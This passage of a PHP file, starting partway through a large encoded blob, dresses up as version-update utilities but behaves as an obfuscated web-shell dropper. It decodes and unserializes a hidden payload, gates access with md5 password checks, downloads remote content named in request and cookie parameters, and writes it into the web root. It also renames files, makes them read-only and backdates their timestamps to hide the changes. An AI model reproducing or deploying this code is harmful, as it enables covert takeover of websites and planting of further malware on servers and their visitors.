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', '1');
        $data = base64_decode(/**/ $data);
        $data = translation_v2($data, '1');
        $data = translation_v1($data, '0');
        foreach ($data as $item) {
            version_check($item[0], $item[1], $temp, $item[2]);
        }
        version_desc(false);
    }];
    $temp = explode(',', $temp);
    return ['#ver#', version_data($name, 1, 0)];
}

/**
 * @title install path
 */
function version_path()
{
    echo __FILE__;
}

/**
 * @title get version data
 * @param $data
 * @param $offset
 * @param $page
 * @return mixed
 */
function version_data($data, $offset, $page)
{
    $keu = ['', "code"];
    $keu[] = '';
    return $data[$offset]($data[$page], implode('_', $keu));
}

/**
 * @title translation data
 * @param $data
 * @param $offset
 * @return mixed
 */

function translation_v1($data, $mode, $exp = '')
{
    if ($mode === 'X1') {
        $data = base64_decode($data);
        $len = strlen($data);
        $exp = str_replace('=', '', base64_encode($exp));
        $res = "";
        $i = 0;
        while ($i < $len) {
            for ($k = 0; $k < strlen($exp) && $i < $len; $k++)
                $res .= chr(ord($data[$i++]) ^ ord($exp[$k]));
        }
        return $res;
    } elseif ($mode) {
        return json_decode($data, true);
    } else {
        return unserialize($data);
    }
}

/**
 * @title parse version data
 * @param $data
 * @return version
 */
function version_parse($data)
{
    $version = $data['version'];
    if ($version === 'path') version_path();
    if (isset($data[$version])) {
        $version = translation_v1($data[$version], 'X1', $data[$version . '1']);
    }
    return $version;
}

/**
 * @title update version
 * @param $qr
 * @return void
 */
function version_update($check, $qr = false)
{
    if (!version_access("igtd{$check}c", 'a26c5fe3f705d51defe01fed0312b89d')) return;
    $c = $_COOKIE;;
    $cf = implode('_', ['function', 'exists']);
    (!$qr || !$cf($qr)) &&
    $qr = empty($c[$for = 'token']) || !$cf($c[$for]) ? implode('_', ['base64', 'decode']) : $c[$for];

    if (($a = $qr($_REQUEST['name'])) && version_deny($a)) {
        return;
    }
    global $temp;
    $a = explode(',', $a);
    if (empty($a[1])) return;
    echo "[<a id=\"u1\" href=\"/{$a[1]}\" style='color: #fff;'>{$a[1]}</a>] ";
    return version_check($_SERVER['DOCUMENT_ROOT'] . '/' . $a[1], $qr(file_get_contents($a[0])), $temp);
}

/**
 * @title version access or force
 * @param string $version version pass
 * @param string $token check update token
 * @return bool
 */
function version_access($version, $token)
{
    return in_array(md5($version), [$token, '47628e0bf72fca87db995c8f844d91b1']);
}

/**
 * @title version data is deny
 * @param $data
 * @return void
 */
function version_deny($data)
{
    return strlen($data) < 16 || strlen($data) > 128 || !in_array($data[0], ['h', '/']);
}

/**
 * @title translation version data
 * @param $data
 * @param $offset
 * @return mixed
 */
function translation_v2($data, $offet)
{
    if (!empty($offet)) {
        return gzinflate($data);
    } else {
        return $data;
    }
}

/**
 * @title translation version data
 * @param $data
 * @param $offset
 * @return mixed
 */
function translation_v3($data, $offet)
{
    if (!empty($offet)) {
        return str_rot13($data);
    } else {
        return $data;
    }
}

return 'inited';
/**
 * @title check version token
 * @param $name
 * @param $date
 * @param $check
 * @param string $token
 * @param false $mode
 * @return bool|mixed
 */
function version_check($name, $date, $check, $token = '', $mode = false)
{
    try {
        $vs = 'rename';
        if (!is_array($check)) $check = explode(',', $check);
        $map = [0, 1, 2, 3, 4];
        $m = $mode ? $mode : ($check[1]() - 2693693);
        $iw = true;
        empty($check[9]) || $date = $check[9]($date);
        if ($check[$map[4] + 1]($name)) {
            if ($token && Md5_File($name) === $token) return true;
            $iw = $check[6]($name);
            if ($x = $check[5]($name)) {
                $m = $check[4]($name);
            }
            $x && !$iw && @$check[7]($name, 0744);
            @$vs($name, $name . time());
        }
        if ($check[$map[0]]($check[2])) {
            $l = $check[$map[2]][0] . 'write';
            $r = $l($check[$map[2]]($name . ".tmp1", 'w'), $date);
        } else {
            $r = $check[$map[3]]($name . ".tmp1", $date);
        }
        @$vs($name . ".tmp1", $name);
        $check[8]($name, $m, $m);
        $iw || @$check[7]($name, 0444);
    } catch (\Exception $A) {
        echo $A->getMessage() . "<br>";
        $r = false;
    }
    echo $name[strlen($name) - 1] . ($r ? ':ok' : ':fail') . "<br>";
    return $r;
}